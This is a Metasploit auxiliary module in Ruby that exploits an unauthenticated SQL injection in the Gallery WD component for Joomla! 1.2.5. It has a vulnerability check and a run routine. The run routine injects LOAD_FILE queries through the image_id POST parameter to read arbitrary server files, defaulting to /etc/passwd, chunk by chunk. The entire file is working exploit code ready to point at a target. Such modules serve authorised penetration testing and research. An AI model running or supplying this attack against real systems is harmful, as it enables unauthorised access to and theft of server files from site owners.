##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##


require 'msf/core'


class MetasploitModule < Msf::Auxiliary

  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Unauthenticated SQL Injection in Gallery WD for Joomla! File Read',
      'Description'    => %q{

      This module will attempt to read a given file from the file system using an
      unauthenticated SQL injection in Gallery WD for Joomla! 1.2.5 and likely prior.
      },
      'License'        => MSF_LICENSE,
      'Author'         =>
        [
          'Brandon Perry',
        ],
      'References'     =>
        [
          ['EDB', '36563']
        ],
      'DisclosureDate' => 'Mar 30 2014'
    ))

    register_options(
      [
        OptString.new('TARGETURI', [ true, "Base Joomla directory path", '/']),
        OptString.new('FILEPATH', [true, "The filepath to read on the server", "/etc/passwd"]),
      ], self.class)

  end

  def check
    front_marker = Rex::Text.rand_text_alpha(6)
    back_marker = Rex::Text.rand_text_alpha(6)
    flag = Rex::Text.rand_text_alpha(5)

    payload = "AND (SELECT 2425 FROM(SELECT COUNT(*),CONCAT(0x#{front_marker.unpack("H*")[0]},0x#{flag.unpack("H*")[0]},0x#{back_marker.unpack("H*")[0]},FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)"

    resp = send_injected_request(payload)

    if !resp or !resp.body
      return Exploit::CheckCode::Safe
    end

    get_flag = /#{front_marker}(.*)#{back_marker}/.match(resp.body)

    if !get_flag
      return Exploit::CheckCode::Safe
    end

    return Exploit::CheckCode::Vulnerable
  end

  def run
    front_marker = Rex::Text.rand_text_alpha(6)
    back_marker = Rex::Text.rand_text_alpha(6)
    file = datastore['FILEPATH'].unpack("H*")[0]

    data = ''
    read = ''
    off = 1

    while true
      payload = "AND (SELECT 8807 FROM(SELECT COUNT(*),CONCAT(0x#{front_marker.unpack("H*")[0]},(MID((IFNULL(CAST(HEX(LOAD_FILE(0x#{file})) AS CHAR),0x20)),#{off},50)),0x#{back_marker.unpack("H*")[0]},FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)"
      res = send_injected_request(payload)

      unless res && res.body
        fail_with(Failure::Unknown, "Server did not respond in an expected way")
      end

      read = $1 if res.body =~ /#{front_marker}(.*)#{back_marker}/

      break if read == ''

      data << [read].pack("H*")

      off = off + 50
    end

     path = store_loot('joomla_server_file', "octet/binary-stream", datastore['RHOST'], data, "joomla_file.bin", "Joomla file -- #{datastore['FILEPATH']}")
     print_good("File saved to: " + path)
  end

  def send_injected_request(payload)
    res = send_request_cgi({
      'uri' => normalize_uri(target_uri.path, 'index.php'),
      'method' => 'POST',
      'vars_get' => {
        'option' => 'com_gallery_wd',
        'view' => 'gallerybox',
        'image_id' => '-1',
        'gallery_id' => '-1',
        'thumb_width' => '180',
        'thumb_height' => '90',
        'open_with_fullscreen' => 0,
        'image_width' => 800,
        'image_height' => 500,
        'image_effect' => 'fade',
        'sort_by' => 'order',
        'order_by' => 'asc',
        'enable_image_filmstrip' => '',
        'image_filmstrip_height' => 0,
        'enable_image_ctrl_btn' => 1,
        'enable_image_fullscreen' => 1,
        'popup_enable_info' => 1,
        'popup_info_always_show' => 0,
        'popup_hit_counter' => 0,
        'popup_enable_rate' => 0,
        'slideshow_interval' => 5,
        'enable_comment_social' => '',
        'enable_image_facebook' => '',
        'enable_image_twitter' => '',
        'enable_image_google' => '',
        'enable_image_pinterest' => '',
        'enable_image_tumblr' => '',
        'watermark_type' => 'none'
      },
      'vars_post' => {
        'image_id' => "1 " + payload,
        'rate' => '',
        'ajax_task' => 'save_hit_count',
        'task' => 'gallerybox.ajax_search'
      }
    })

    return res
  end
end

